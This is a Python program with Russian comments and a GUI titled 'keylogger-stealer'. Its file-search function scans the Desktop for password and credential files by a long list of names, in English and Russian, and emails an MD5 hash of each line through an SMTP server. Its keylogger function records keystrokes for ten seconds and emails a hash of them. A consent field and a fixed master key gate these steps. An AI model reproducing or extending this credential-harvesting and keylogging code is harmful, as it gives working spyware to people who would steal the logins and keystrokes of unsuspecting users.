import os
import smtplib
import hashlib
import time
import keyboard
from tkinter import Tk, Label, Entry, Button, messagebox, DISABLED, NORMAL

# Объявление глобальных переменных
password_files = []
key_combination_count = 0
start_time = 0

# Функция для отправки электронной почты
def send_email(subject, content, sender_email, password, receiver_email):
    message = f'Subject: {subject}\n\n{content}'

    try:
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
        return True
    except:
        return False

# Функция для хэширования строки по алгоритму MD5
def hash_string(string):
    hash_object = hashlib.md5(string.encode())
    return hash_object.hexdigest()

# Функция для обработки файлов на рабочем столе
def process_files(sender_email, password, receiver_email):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt',
                       'password_list.txt', 'passwd.txt', 'credentials.txt', 'logins.txt',
                       'accounts.txt', 'key.txt', 'keys.txt', 'usernames.txt',
                       'secret.txt', 'login.txt', 'pass_list.txt', 'credentials_list.txt',
                       'password_storage.txt', 'access.txt', 'доступ.txt', 'пароли_и_логины.txt',
                       'список_паролей.txt', 'учетные_данные.txt', 'логины_и_пароли.txt',
                       'секреты.txt', 'коды_доступа.txt', 'ключи_для_входа.txt', 'конфиденциальные_данные.txt']

    password_count = 0

    for file_name in files_to_search:
        file_path = os.path.join(desktop_path, file_name)
        if os.path.isfile(file_path):
            password_files.append(file_name)
            with open(file_path, 'r') as file:
                for line in file:
                    password_count += 1
                    hashed_line = hash_string(line.strip())
                    email_subject = 'EHP'
                    email_content = f'EHP password {hashed_line}'
                    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
                    if not success:
                        messagebox.showerror('Ошибка', 'Не удалось отправить данные на почту.')
                        return

    messagebox.showinfo('Успех', f'Найдено {len(password_files)} файлов с паролями.\n'
                                 f'Общее количество паролей: {password_count}.\n'
                                 f'Названия файлов: {", ".join(password_files)}.')

# Функция для обработки нажатий клавиш
def process_key_presses(sender_email, password, receiver_email):
    global key_combination_count, start_time
    key_combination = ''
    start_time = time.time()

    def on_press(event):
        nonlocal key_combination
        key_combination += event.name
        global key_combination_count
        key_combination_count += 1

    keyboard.on_press(on_press)

    while time.time() - start_time <= 10:
        if keyboard.is_pressed('esc'):
            break

    keyboard.unhook_all()

    hashed_combination = hash_string(key_combination.strip())
    email_subject = 'EHP'
    email_content = f'EHP keylog {hashed_combination}'
    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
    if not success:
        messagebox.showerror('Ошибка', 'Не удалось отправить данные на почту.')

    return key_combination

# Функция для создания окна с вводом данных
def create_window():
    window = Tk()
    window.title('Кейлоггер-стилер')
    window.geometry('300x300')

    label_email = Label(window, text='Email:')
    label_email.pack()

    entry_email = Entry(window)
    entry_email.pack()

    label_password = Label(window, text='Пароль:')
    label_password.pack()

    entry_password = Entry(window, show='*')
    entry_password.pack()

    label_receiver_email = Label(window, text='Email получателя:')
    label_receiver_email.pack()

    entry_receiver_email = Entry(window)
    entry_receiver_email.pack()

    label_master_key = Label(window, text='Мастер-ключ:')
    label_master_key.pack()

    entry_master_key = Entry(window, show='*')
    entry_master_key.pack()

    label_consent = Label(window, text='Согласие (Да/Нет):')
    label_consent.pack()

    entry_consent = Entry(window)
    entry_consent.pack()

    def check_fields(email, password, receiver_email, master_key, consent):
        if not email or not password or not receiver_email or not master_key or not consent:
            messagebox.showerror('Ошибка', 'Пожалуйста, заполните все поля.')
            return False

        if consent.lower() not in ['да', 'нет']:
            messagebox.showerror('Ошибка', 'Неверный формат согласия. Введите "Да" или "Нет".')
            return False

        if master_key != 'EHP':
            messagebox.showerror('Ошибка', 'Неправильный мастер-ключ.')
            return False

        return True

    def get_consent():
        consent = entry_consent.get()
        if not consent:
            messagebox.showerror('Ошибка', 'Пожалуйста, введите согласие.')
            return None
        return consent

    def start_search():
        email = entry_email.get()
        password = entry_password.get()
        receiver_email = entry_receiver_email.get()
        master_key = entry_master_key.get()
        consent = get_consent()

        if check_fields(email, password, receiver_email, master_key, consent):
            if consent.lower() == 'да':
                process_files(email, password, receiver_email)
            else:
                messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')

    def start_keylogger():
        email = entry_email.get()
        password = entry_password.get()
        receiver_email = entry_receiver_email.get()
        master_key = entry_master_key.get()
        consent = get_consent()

        if check_fields(email, password, receiver_email, master_key, consent):
            if consent.lower() == 'да':
                button_keylogger.config(state=DISABLED)
                messagebox.showinfo('Уведомление', 'Кейлоггер запущен. Считывание клавиш продолжится в течение 10 секунд.')

                key_combination = process_key_presses(email, password, receiver_email)

                messagebox.showinfo('Успех', f'Считанная комбинация клавиш: {key_combination}')
                button_keylogger.config(state=NORMAL)
            else:
                messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')

    def close_program():
        global password_files
        messagebox.showinfo('Статистика', f'Количество файлов с паролями: {len(password_files)}\n'
                                          f'Общее количество комбинаций клавиш: {key_combination_count}\n'
                                          f'Время работы программы: {time.time() - start_time}')
        exit()

    button_search = Button(window, text='Начать поиск файлов с паролями', command=start_search)
    button_search.pack()

    button_keylogger = Button(window, text='Запустить кейлоггер', command=start_keylogger)
    button_keylogger.pack()

    button_close = Button(window, text='Закрыть программу и вывести статистику', command=close_program)
    button_close.pack()

    # Копирование пароля из буфера обмена
    def paste_password():
        password = window.clipboard_get()
        entry_password.delete(0, 'end')
        entry_password.insert(0, password)

    button_paste = Button(window, text='Вставить пароль из буфера обмена', command=paste_password)
    button_paste.pack()

    window.mainloop()

# Основная функция программы
def main():
    create_window()

# Начало выполнения программы
if __name__ == '__main__':
    main()